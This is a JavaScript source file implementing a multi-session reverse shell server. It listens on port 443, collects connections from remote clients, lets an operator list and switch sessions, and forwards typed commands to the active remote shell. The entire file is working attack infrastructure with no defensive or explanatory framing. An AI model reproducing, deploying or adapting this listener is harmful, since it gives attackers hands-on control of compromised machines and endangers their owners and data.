const moduleNet = require("net");
const moduleReadLine = require("readline");
const moduleStdout = require("stdout-stream");

/**
 * TODO:
 * Split server logic from displaying and colouring incoming messages. Dedicated class will be used for view.
 */

/**
 *  Class, which provides multisession shell server functionality.
 */
class ShellServer {
  /**
   * Class constructor
   * @param {integer} port - number of port to listen connection on
   */
  constructor(port) {
    this.readLine = moduleReadLine.createInterface({
      input: process.stdin,
      output: process.stdout
    });

    /* dictionary containing all connected sessions identifiers */
    this.sessionsDict = {};

    /* server object */
    this.server = new moduleNet.Server();

    // number of all connected sessions (might already be disconnected)
    // each connected session has its own unique identifier
    this.maxSessionNumber = 1;

    // number of session to which commands from input line will be send
    this.activeSession = 0;

    // last reception time
    this.lastReceptionTime = Date.now();

    this.server.on("connection", socket => this.onNewConnection(socket));
    this.readLine.on("line", line => this.onReadLine.call(this, line));

    this.server.listen(port);
    writeln(FgWhite + "Reverse Shell Server v1.3 - listening on port:" + port);
    writeln(
      "CmdLine - enter:\n@ - to list all connected sessions\n@n - to switch to session number\n@exit - to exit\n"
    );
    setInterval(this.sendPing.bind(this), 2000);
    setInterval(this.printInputReady.bind(this), 100);
  }

  /**
   *
   * function sending pings to all connected clients
   */
  sendPing() {
    Object.keys(this.sessionsDict).forEach(key => {
      this.sessionsDict[key].write("@ping@\n");
    });
  }
  /**
   *
   * @param {Socket} socket
   */
  onNewConnection(socket) {
    write(socket.remoteAddress);
    const sessionId = this.maxSessionNumber++;
    this.sessionsDict[sessionId] = socket;

    this.printSessionPrefix(FgGreen, sessionId);
    writeln(socket.remoteAddress + " " + socket.remotePort);

    // if no active sessions - connected session becomes active session_id
    if (this.activeSession == 0) this.activeSession = sessionId;

    socket.on("data", data => this.onReceivedData(sessionId, data));
    socket.on("close", () => this.onConnectionClosed(sessionId));
    socket.on("error", () => this.onConnectionError(sessionId));
  }

  /**
   *  Prints input ready mark containing active session id.
   */
  printInputReady() {
    if (
      this.lastReceptionTime > 0 &&
      Date.now() - this.lastReceptionTime > 300
    ) {
      this.printSessionPrefix(FgBlue, this.activeSession);
      this.lastReceptionTime = 0;
    }
  }

  /**
   *
   * @param {string} line
   */
  onReadLine(line) {
    if (line === "@exit") {
      write(RESET);
      process.exit(0);
    }

    // no active sessions -> not necessary to interpret session listing and switching commands
    if (this.activeSession == 0) {
      return;
    }

    // no special command in input line, send command do client
    if (!line.startsWith("@")) {
      this.sessionsDict[this.activeSession].write(line + "\n");
      return;
    }

    if (line === "@") {
      // list all sessions
      const sessionKeys = Object.keys(this.sessionsDict);
      write("Existing sessions:");
      sessionKeys.forEach(key => {
        write("[" + key + "]");
      });
      writeln();
    } else {
      // special command - starts with @ provided in input line
      const tempId = parseInt(line.substr(1));
      if (isNaN(tempId)) writeln("Invalid session number");
      else if (tempId in this.sessionsDict) this.activeSession = tempId;
      else writeln("No session number:" + tempId + " exists");
    }
  }

  /**
   * Print
   * @param {string} color
   * @param {integer} sessionId
   */
  printSessionPrefix(color, sessionId) {
    if (sessionId == 0) write(color + "[-no-sessions-] ");
    else write(color + "[" + sessionId.toString() + "] ");
  }

  /**
   * Process input received from client
   * @param {integer} sessionId
   * @param {string} prefix - prefix of input
   * @param {string} content - content of input
   */
  processReceivedLine(sessionId, prefix, content) {
    if (prefix === "cmd") {
      this.printSessionPrefix(FgYellow, sessionId);
      moduleStdout.write(prefix + "---" + content + "\n");
    } else {
      moduleStdout.write("unknown client response:" + prefix);
    }
  }

  /**
   * Called on socket received data
   * @param {integer} sessionId
   * @param {Buffer} data
   */
  onReceivedData(sessionId, data) {
    const lines = data.toString().split("\n");
    for (let index = 0; index < lines.length; index++) {
      this.lastReceptionTime = Date.now();
      // get line prefix
      // lines contains '\r' char inside - caret return, which might cause side effects

      const completeLine = lines[index].replace("\r", "");
      if (completeLine.length == 0) continue;
      const endOfPrefix = completeLine.substr(1).indexOf("@");
      const currentLinePrefix = completeLine.substr(1, endOfPrefix);
      const currentLine = completeLine.substr(endOfPrefix + 2);
      this.processReceivedLine(sessionId, currentLinePrefix, currentLine);
    }
  }

  /**
   *
   * @param {integer} sessionId
   */
  onConnectionError(sessionId) {
    if (sessionId == undefined) throw new Error("sessionId is undefined");
    writeln();
    this.printSessionPrefix(FgRed, sessionId);
    writeln("session error");
  }

  /**
   * Socket connection close event handler.
   * @param {*} sessionId
   */
  onConnectionClosed(sessionId) {
    this.printSessionPrefix(FgRed, sessionId);
    moduleStdout.write("session disconnected\n");
    delete this.sessionsDict[sessionId];
    this.activeSession = this.findNextSession(sessionId);
  }
  /**
   *
   * @param {*} sessionId
   * @return {Integer}
   */
  findNextSession(sessionId) {
    if (sessionId == undefined) throw new Error("sessionId is undefined");

    // no more existing sessions
    if (Object.keys(this.sessionsDict).length == 0) return 0;

    // try to find next larger session number, than currently active
    for (let i = sessionId; i < this.maxSessionNumber; i++)
      if (i in this.sessionsDict) return i;

    // try to find available session_id
    for (let i = 1; i < sessionId; i++) if (i in this.sessionsDict) return i;

    throw new Error("sth went wrong");
  }
}

const RESET = "\x1b[0m";
const FgRed = "\x1b[31m";
const FgGreen = "\x1b[32m";
const FgYellow = "\x1b[33m";
const FgBlue = "\x1b[34m";
const FgWhite = "\x1b[37m";

/**
 *
 * @param {string} msg
 */
function write(msg) {
  moduleStdout.write(msg);
}

/**
 *
 * @param {string} msg
 */
function writeln(msg) {
  if (!msg) msg = "";
  moduleStdout.write(msg + "\n");
}

const port = 443;
new ShellServer(port);
